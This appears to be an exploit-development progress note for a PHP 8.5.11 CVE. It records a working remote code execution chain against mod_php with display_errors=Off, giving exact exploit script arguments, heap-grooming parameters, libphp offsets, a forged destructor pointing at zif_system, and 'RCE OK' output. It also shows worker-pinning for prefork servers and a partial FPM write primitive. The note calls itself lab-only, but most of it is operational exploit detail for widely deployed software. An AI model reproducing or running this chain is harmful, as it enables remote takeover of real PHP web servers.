# Three approaches, 2026-10-26

Lab only. Target builds: `php:8.5.11-apache` (mod_php), `php:8.5.11-fpm`
(official image), fixed controls on 8.5.12. Container names in parentheses.

## 1. CVE-2026-109618: executor/object-handler half

The premise that 8.5.12 patches `Zend/zend_object_handlers.c`
(`zend_std_read/write/unset_property`) is wrong. The 8.5.12 commit
`31c0ea7d7ff` changes:

```
Zend/zend_alloc.c
Zend/zend_execute_API.c
Zend/zend_hash.c
Zend/zend_vm_def.h
main/php_variables.c
main/rfc1867.c
main/SAPI.c
main/main.c
ext/session/session.c
```

`Zend/zend_object_handlers.c` is not in the diff. The only object-handler
commit in the window is `83c17e31494` (GH-21776, older, unrelated).

The property `__get` path calls
`zend_call_known_instance_method_with_1_params()` at
`Zend/zend_object_handlers.c:243`, which reaches `zend_call_function()`. In
8.5.11 that function saves `EG(fake_scope)`, sets it to NULL, and restores it
after the call. An OOM inside `__get` skips the restore, but the stale value is
NULL, not the object's class. The 8.5.12 fix adds the delayed-OOM check in
`zend_call_function()` (entry, internal-arginfo path, VM-interrupt path), so
the restore runs; it fixes the call API, not the individual property handlers.

The genuinely stale executor state is the pre-`init_executor()` shutdown case:
`EG(user_error_handler)`, `EG(user_exception_handler)`, `EG(exception)`,
`EG(error_handling)`, and `EG(objects_store)` can be used by
`zend_error_zstr_at` after an OOM. `zend_shutdown_executor_values()` now resets
them. That is the startup-OOM path. On FPM a failed `php_request_startup()`
exits the worker (`fpm_main.c:1838-1843`); on mod_php the worker survives and
the request shutdown runs, which is the path already used by the
`display_errors=Off` chain. A script-level `__get` OOM keeps the FPM worker but
`init_executor()` resets `EG(fake_scope)` for the next request, and shutdown
destructors establish their own `EG(current_execute_data)`. No new
cross-request primitive was found.

Remaining 109618 work is the parser/hash-table partial bucket
(`path1_hash/`): `_zend_hash_str_add_or_update_i()` increments `nNumUsed` and
`nNumOfElements` before `zend_string_init()` fails, leaving bucket 0
uninitialized for teardown. The trigger is reproduced (`$_POST['files']`,
`nNumUsed` 0 -> 1, key allocation OOM); the groom from a 280-byte raw buffer
into the new table's bin-320 `arData` is not yet landed. `session.auto_start=1`
leaves stale session state but has no pre-RINIT consumer (`path2_autostart/`).

## 2. mod_php `display_errors=Off`: complete

The off chain is complete on stock `php.ini-production` (Rounds 7 and 9 of
`progress.md`), not just the earlier partial state. Re-verified here on
`p2s-8511-off`:

```
A1 body=1064604 resp=222 HTTP/1.0 500
B1 main=0x74ef68a00000 libphp=0x74ef65400000
RCE OK
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The four stages:

1. A1: `mk_a1_off.py --progress-early --progress-len=4044 --post40=1
   --big=78 --burners=19 --cttail=4000 --sid-late`, chunked, GET path with
   `q0000000..4=v` and `g0..g7=<15-byte>`. `php_url_encode()` OOM in
   `php_session_reset_id()` with `send_cookie=1`, `mod_data=NULL`, id page
   0x137, `bin128=0`, `free_pages=0`.
2. B1: `off_b1b.php 8091 14 0x137 0xC8000 0x1018 300 0 400 0`. The 400-page
   partial forge lands at 0x137; 300 nested arrays fill the freed tail; the
   819200-byte `Set-Cookie` leaks `pDestructor=zval_ptr_dtor`.
   `libphp = qword - 0x7b47a0`; `main` is the next cluster with count >= 50
   within 0x4000000 of libphp.
3. A2: `cheap_oom_a.py --parts 880 --depth 64 --fillers 115` leaves
   `PS(http_session_vars)` at `main+0x7c720`.
4. B2: fake references (500 x 384-byte n1, 495 x n2) and a fake HashTable at
   `S=main+0xF7398`; `pDestructor=zif_system=libphp+0x5996e0`.

Prefork production condition: `p2s-8511-prefork` uses `lab/mpm_prefork_4.conf`
(4 workers). Three partial chunked POSTs blocked three workers; the fourth
served all four requests:

```
pin 0/1/2: worker blocked
A1 500
B1 main=0x7f6a07800000 libphp=0x7f6a04200000
RCE OK uid=33(www-data)
```

A stock `MaxRequestWorkers=150` target needs 149 pinned connections; the
mechanism is identical. `display_errors=Off` is not a mitigation for the
session state; it only removes the `headers_sent` warning used by the On
variant.

## 3. Native FPM `BG(unserialize)`: write primitive + `zif_system` call verified; leak missing

Sizes: `struct php_unserialize_data` 0x2018 (3 pages);
`var_dtor_entries` 0x1010 (2 pages); `data` at offset 0x10. `tmp_var()` checks
`used_slots + num > 255`; a negative `used_slots` bypasses the check, writes
`ZVAL_UNDEF(&data[used_slots])`, and returns `&data[used_slots]`. The decoded
session zval is then written at `last_dtor + 16 + 16*used_slots`.

Under gdb on the official 8.5.11 FPM, with the A (`session_start()` decode OOM)
followed by `fcgi_dreclaim.py` and a 3-page filename raw buffer:

```
INIT level=0 data=(nil)
BAILOUT level=1 d=0x7b617dc7f000
INIT level=1 data=0x7b617dc7f000
D bytes: last=d+0x38 first_dtor=last_dtor=d+0x2000
PATCH last_dtor=d+0x100 used=-2 target=d+0xF0
TMP target=0x7b617dc7f0f0
0x7b617dc7f0f0: 0x0000000000003039   (decoded S2 integer 12345)
DESTROY level=2
```

The 3-page raw filename did **not** reclaim `d`; the A's `d` was still intact.
A **5-page** raw filename matches the 5-page coalesced `d`+dtor run and **does**
reclaim `d`: at the second session init the `d` bytes are the raw `0x52`
filler, and the gdb patch (`last_dtor=d+0x3000`, `used_slots=-2`) writes the
decoded S2 integer 12345 at `d+0x2FF0`. The raw's fake header appeared at the
raw offset **0x120** in the parser's view, so the next steps are to place the
fake `last`/`first_dtor`/`last_dtor`/`used_slots` at that offset and to obtain
the `d` address for the absolute `last_dtor` pointer.

A `var_destroy()` fake-array route was considered but is **not reachable** in
the stale-`d` reuse. `php_var_unserialize_destroy()` calls `var_destroy()` only
when `BG(unserialize).level == 1`. The A leaves the stale `d` at level 1; the
B's `php_var_unserialize_init()` raises it to 2; the destroy lowers it to 1
without running `var_destroy()`. The fake array's `pDestructor` is never
called. The active primitive remains `tmp_var()` with a negative `used_slots`;
the write target must be a fake HashTable `pDestructor` or a `zend_string`
length.

Function-table scan for `zif_system`: `EG+456` gives the function table
(`FT`), its `arData` and 1212 buckets. Bucket 0 shows the key at +24 pointing
at an interned `.rodata` string. The `system` string was not found by the
current scanner, and the stripped binary has no `zif_system` symbol. The fire
still needs the FPM libphp base and the FPM `zif_system` offset.

Alternative: a chunk-boundary split. Allocate `2 MiB - 3 pages - overhead`
before `session_start()`, so `d` fills a chunk tail and the dtor block starts in
the next chunk; the frees do not coalesce, and a 2-page B allocation can reclaim
the dtor while `d` stays valid. A userland request-heap allocation cannot stay
live between `d` and its dtor; `pemalloc`, opcache, APCu, and FFI are outside the
request heap, so the split must be a chunk boundary or an extension leak.

Targets, once `last_dtor` is controlled: write at `str+8` so the zval value
lands at `str+0x10` and forges a `zend_string` length; write at
`pDestructor-8` so the zval value lands at the HashTable destructor. The decoded
session value is attacker-controlled. A second A with `headers_sent` can set
`send_cookie=1` while the first A's `d` persists, giving the forged `PS(id)`
`Set-Cookie` leak for the heap addresses.

Round 16 closed the call half: with the frame and `pDestructor` written under
gdb at `zend_array_destroy` entry, the session array's destructor calls
`zif_system` with a fake `execute_data` and the command runs on the FPM worker
(`/tmp/fpm5_proof` = `uid=33(www-data)`, 3/3). The earlier hang was a live
bucket-chain corruption by the flush-time frame write, not a `func` problem.
The remaining gap is the leak: the reclaiming `zend_string` header covers
`d + 0..0x17`, so `d->last_dtor` is the string length and attacker bytes start
at `d + 0x18`. Without a heap address there is no absolute `last_dtor`; a bare
endpoint has no leak sink. Details and the verified frame layout:
`HANDOFF.md`, `progress.md` Round 16.

## Files added

- `lab/mpm_prefork_4.conf`: 4-worker prefork for the pinning test.
- `fpm/nginx-8511.conf`: nginx upstream for the 8.5.11 FPM lab.
- `fpm/fcgi_dreclaim.py`: direct FastCGI raw-filename d-reclaim client.
- `fpm/probe-dreclaim.gdb`: gdb probe for the d-reclaim and `tmp_var` write.
- `progress.md` Rounds 15-17: d-reclaim, gdb call mechanics, chunk split and the native leak boundary.
